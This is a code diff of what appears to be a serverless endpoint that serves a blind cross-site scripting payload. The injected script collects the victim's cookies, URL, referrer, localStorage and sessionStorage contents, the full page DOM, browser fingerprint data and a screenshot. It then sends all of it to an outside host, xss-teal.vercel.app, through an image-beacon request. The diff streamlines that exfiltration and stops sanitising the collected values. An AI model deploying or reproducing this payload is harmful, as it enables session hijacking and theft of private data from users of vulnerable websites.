@@ -19,6 +19,8 @@ export default async function handler(req, res) {
   
   res.setHeader('Content-Type', 'application/javascript');
   res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   
   const payload = `
 var data = {};
@@ -28,18 +30,8 @@ function safe(val) {
 }
 
 function sendData(payload) {
-  if (location.protocol === 'file:') {
-    var img = new Image();
-    img.src = 'https://xss-teal.vercel.app/?' + btoa(JSON.stringify(payload));
-  } else {
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://xss-teal.vercel.app/", true);
-    xhr.setRequestHeader("Content-type", "text/plain");
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState == 4 && xhr.status) {}
-    };
-    xhr.send(JSON.stringify(payload));
-  }
+  var img = new Image();
+  img.src = 'https://xss-teal.vercel.app/?' + btoa(JSON.stringify(payload));
 }
 
 function takeScreenshot() {
@@ -66,14 +58,14 @@ function takeScreenshot() {
 }
 
 function collectData() {
-  try { data.uri = safe(location.toString()); } catch(e) { data.uri = ""; }
-  try { data.cookies = safe(document.cookie); } catch(e) { data.cookies = ""; }
-  try { data.referrer = safe(document.referrer); } catch(e) { data.referrer = ""; }
-  try { data["user-agent"] = safe(navigator.userAgent); } catch(e) { data["user-agent"] = ""; }
-  try { data.origin = safe(location.origin); } catch(e) { data.origin = ""; }
+  try { data.uri = location.toString() || ""; } catch(e) { data.uri = ""; }
+  try { data.cookies = document.cookie || ""; } catch(e) { data.cookies = ""; }
+  try { data.referrer = document.referrer || ""; } catch(e) { data.referrer = ""; }
+  try { data["user-agent"] = navigator.userAgent || ""; } catch(e) { data["user-agent"] = ""; }
+  try { data.origin = location.origin || ""; } catch(e) { data.origin = ""; }
   try { 
-    var lang = navigator.language || navigator.userLanguage;
-    data.lang = safe(lang);
+    var lang = navigator.language || navigator.userLanguage || "";
+    data.lang = lang;
   } catch(e) { data.lang = ""; }
   
   try {
@@ -81,12 +73,12 @@ function collectData() {
     var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
     var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
     var gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    data.gpu = safe(gpu);
+    data.gpu = gpu || "";
   } catch(e) { data.gpu = ""; }
   
-  try { data.localstorage = window.localStorage; } catch(e) { data.localstorage = ""; }
-  try { data.sessionstorage = window.sessionStorage; } catch(e) { data.sessionstorage = ""; }
-  try { data.dom = safe(document.documentElement.outerHTML); } catch(e) { data.dom = ""; }
+  try { data.localstorage = JSON.stringify(window.localStorage) || ""; } catch(e) { data.localstorage = ""; }
+  try { data.sessionstorage = JSON.stringify(window.sessionStorage) || ""; } catch(e) { data.sessionstorage = ""; }
+  try { data.dom = document.documentElement.outerHTML || ""; } catch(e) { data.dom = ""; }
   
   takeScreenshot();
 }
